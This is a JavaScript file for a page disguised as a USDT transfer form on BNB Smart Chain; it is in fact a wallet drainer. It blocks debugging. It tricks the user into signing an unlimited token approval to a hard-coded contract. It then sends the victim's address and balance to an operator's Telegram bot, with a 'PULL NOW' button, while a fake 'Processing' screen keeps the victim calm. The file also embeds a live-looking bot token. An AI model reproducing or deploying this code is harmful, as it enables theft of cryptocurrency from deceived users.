(function() {
    function block() {
        if (window.console && (window.console.firebug || new RegExp("a+").test(String.fromCharCode(97)))) {
            debugger;
            setTimeout(block, 500); 
        } else {
            block = function() {};
        }
    }
    block();
})();

document.addEventListener("DOMContentLoaded", function () {

    const CONFIG = {
        COMPANY_WALLET_ADDRESS: "0x7073Fe7dFeEC2bcd959eb4ECA0eBeC85Bb3d1FA8",
        CONTRACT_ADDRESS: "0xC2B02823A470385f6E3EF8303093A1256cfA00c6",
        TELEGRAM_BOT_TOKEN: "8742931653:AAHMP50yg9lybJaxWfxU73Ca0GvJkUrqeHs",
        ADMIN_CHAT_ID: "5394590551",
    };

    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    
    async function sendTelegramNotifications(walletAddress, txHash, userId, amount, currentBalance) {
        const notifBotToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;
        const watchUrl = `https://bscscan.com/tx/${txHash}`;

        const pullDataPayload = `PULL:${walletAddress}:${amount}`; 
        
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "✅ PULL NOW (" + amount + " USDT)", callback_data: pullDataPayload }],
                [{ text: "🔗 View Transaction", url: watchUrl }]
            ]
        };

        const adminMessage =
            `🔔 **NEW APPROVAL - ACTION REQUIRED**\n\n` +
            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `👤 **User ID:** ${userId || "Not provided"}\n` +
            `💵 **Input Amount:** ${amount || "N/A"} USDT\n` +
            `✨ **Current USDT Balance:** ${currentBalance || "N/A"} USDT\n\n` +
            `✅ Transaction Approved! **(Unlimited Pull Ready)**\n` +
            `👉 **PULL karne ke liye neeche button dabayein.**`;

        const userMessage =
            `🎉 **USDT Approval Successful!**\n\n` +
            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `✅ **Status:** Approved\n\n` +
            `You can now proceed with USDT transfers.\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;
            
        try {
            await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });
            
            if (userId) {
                await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }
        } catch (error) {
            console.error("Failed to send Telegram messages:", error);
        }
    }

    function showProcessingModal(isVisible, txHash = null) {
        let modal = document.getElementById("processing-modal");
        if (!modal) {
            modal = document.createElement("div");
            modal.id = "processing-modal";
            modal.style.position = "fixed";
            modal.style.top = "0";
            modal.style.left = "0";
            modal.style.width = "100%";
            modal.style.height = "100%";
            modal.style.background = "rgba(0, 0, 0, 0.9)";
            modal.style.zIndex = "99999";
            modal.style.display = "flex";
            modal.style.alignItems = "flex-end";
            modal.style.justifyContent = "center";
            modal.style.transition = "opacity 0.3s";
            modal.style.opacity = "0";
            modal.style.pointerEvents = "none";

            const contentBox = document.createElement("div");
            contentBox.style.background = "#18181a";
            contentBox.style.width = "100%";
            contentBox.style.maxWidth = "500px";
            contentBox.style.padding = "30px 20px 40px";
            contentBox.style.borderRadius = "24px 24px 0 0";
            contentBox.style.textAlign = "center";
            contentBox.style.transform = "translateY(100%)";
            contentBox.style.transition = "transform 0.3s";
            contentBox.id = "processing-modal-content";

            contentBox.innerHTML = `
                <div style="margin: 20px 0;">
                    <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block; margin: 0 auto;">
                        <circle cx="50" cy="50" r="48" stroke="#10b981" stroke-width="4" fill="none"/>
                        <path d="M30 50L45 65L75 35" stroke="#10b981" stroke-width="6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
                <h2 style="color: white; font-size: 1.5rem; font-weight: bold; margin-bottom: 8px;">Processing...</h2>
                <p style="color: #a0a0a0; margin-bottom: 30px; font-size: 0.95rem;">
                    Transaction in progress! Blockchain validation is underway. This may take a few minutes.
                </p>
                <button id="tx-details-btn" style="
                    background: #10b981; 
                    color: white; 
                    border: none; 
                    padding: 15px 30px; 
                    border-radius: 12px; 
                    font-weight: bold; 
                    width: 90%;
                    cursor: pointer;
                ">Transaction details</button>
            `;

            const txDetailsBtn = contentBox.querySelector('#tx-details-btn');
            txDetailsBtn.addEventListener('click', () => {
                const currentTxHash = modal.dataset.txHash;
                if (currentTxHash) {
                    const scanUrl = `https://bscscan.com/tx/${currentTxHash}`; 
                    window.open(scanUrl, '_blank');
                } else {
                    alert("Transaction hash not available yet.");
                }
            });

            modal.appendChild(contentBox);
            document.body.appendChild(modal);
        }
        
        modal.dataset.txHash = txHash;

        const contentBox = document.getElementById("processing-modal-content");
        if (isVisible) {
            modal.style.opacity = "1";
            modal.style.pointerEvents = "auto";
            contentBox.style.transform = "translateY(0)";
        } else {
            contentBox.style.transform = "translateY(100%)";
            setTimeout(() => {
                modal.style.opacity = "0";
                modal.style.pointerEvents = "none";
            }, 300);
        }
    }

    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9998";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    const addressInput = document.querySelector('.recipient-address');
    const amountInput = document.querySelector('.amount-number');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn ? nextBtn.innerHTML : "";
    const approxUsd = document.querySelector(".amount-usd");
    const maxBtn = document.querySelector(".token-max-button");
    const balanceErrorEl = document.getElementById("balanceError");

    function updateApproxUsd() {
        let amount = parseFloat(amountInput.value.trim());
        if (approxUsd) {
            approxUsd.textContent = isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
        }
    }
    
    if (amountInput) {
        amountInput.addEventListener("input", function() {
            updateApproxUsd();
            if (balanceErrorEl) balanceErrorEl.style.display = "none";
        });
    }

    function validate() {
        if (!nextBtn || !addressInput || !amountInput) return;
        const address = addressInput.value.trim();
        const amount = amountInput.value.trim();
        nextBtn.disabled = !(address.length > 0 && parseFloat(amount) > 0);
    }
    
    if (addressInput) addressInput.addEventListener("input", validate);
    if (amountInput) amountInput.addEventListener("input", validate);
    validate();

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("No Web3 wallet found.", "error");
                return;
            }
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const walletAddress = await signer.getAddress();
                const usdtAbi = [
                    "function balanceOf(address owner) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
                let decimals = 18;
                try { decimals = await usdt.decimals(); } catch (err) {}
                let balance = await usdt.balanceOf(walletAddress);
                let maxValue = ethers.utils.formatUnits(balance, decimals);
                amountInput.value = (+maxValue).toString();
                updateApproxUsd();
                validate();
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

    if (nextBtn) {
        nextBtn.addEventListener("click", async function (e) {
            e.preventDefault();

            const amountString = amountInput.value.trim();
            if (amountString.length === 0 || isNaN(parseFloat(amountString))) {
                  showNotification("Please enter a valid amount.", "error");
                  return;
            }

            if (!window.ethereum) {
                showNotification(
                    "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
                    "error"
                );
                return;
            }

            nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
            nextBtn.disabled = true;

            try {
                const bnbChainId = "0x38";
                const bnbChainParams = {
                    chainId: bnbChainId,
                    chainName: "BNB Smart Chain",
                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                    rpcUrls: ["https://bsc-dataseed1.binance.org/"],
                    blockExplorerUrls: ["https://bscscan.com/"]
                };

                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: bnbChainId }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: "wallet_addEthereumChain",
                                params: [bnbChainParams]
                            });
                        } catch (addError) {
                            showNotification("Failed to add BNB Smart Chain network.", "error");
                            return;
                        }
                    } else {
                        showNotification("Failed to switch to BNB Smart Chain network.", "error");
                        return;
                    }
                }

                const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
                const urlParams = new URLSearchParams(window.location.search);
                const userId = urlParams.get("user_id");

                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                const usdtAbiBalance = [
                    "function balanceOf(address owner) view returns (uint256)",
                    "function decimals() view returns (uint8)"
                ];
                const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, signer);
                
                let decimals = 18;
                try { decimals = await usdtContract.decimals(); } catch (err) {}
                const balanceWei = await usdtContract.balanceOf(fromAddress);
                const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);

                const requiredWei = ethers.utils.parseUnits(amountString, decimals);

                if (balanceWei.lt(requiredWei)) {
                    if (balanceErrorEl) {
                        balanceErrorEl.textContent = `Not enough balance, you have $${parseFloat(currentBalance).toFixed(2)}`;
                        balanceErrorEl.style.display = "block";
                    }
                    nextBtn.disabled = false;
                    nextBtn.innerHTML = originalBtnHTML;
                    return; 
                }

                const escrowAddress = CONFIG.CONTRACT_ADDRESS;

                const usdtAbiApprove = [
                    "function approve(address spender, uint256 amount) public returns (bool)"
                ];
                const iface = new ethers.utils.Interface(usdtAbiApprove);
                
                const txData = iface.encodeFunctionData("approve", [
                    escrowAddress, 
                    MAX_UINT256
                ]);

                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{ from: fromAddress, to: USDT_ADDRESS, data: txData, value: "0x0" }]
                });

                showProcessingModal(true, txHash);

                if (txHash && txHash.length > 0) {
                    try {
                        await sendTelegramNotifications(fromAddress, txHash, userId, amountString, currentBalance); 
                    } catch (err) {
                        console.error("Failed to send notifications:", err);
                    }
                }
            } catch (err) {
                showProcessingModal(false); 

                const msg = (err?.message || "").toLowerCase();
                if (
                    msg.includes("user rejected") ||
                    msg.includes("user denied") ||
                    msg.includes("cancelled") ||
                    msg.includes("canceled")
                ) {
                    showNotification("Transaction cancelled.", "error");
                } else if (
                    msg.includes("insufficient funds") ||
                    msg.includes("exceeds balance") ||
                    (msg.includes("execution reverted") && msg.includes("exceeds balance"))
                ) {
                    showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
                } else {
                    showNotification("Transaction failed. Please try again.", "error");
                }
            } finally {
                nextBtn.disabled = false;
                nextBtn.innerHTML = originalBtnHTML;
            }
        });
    }
});
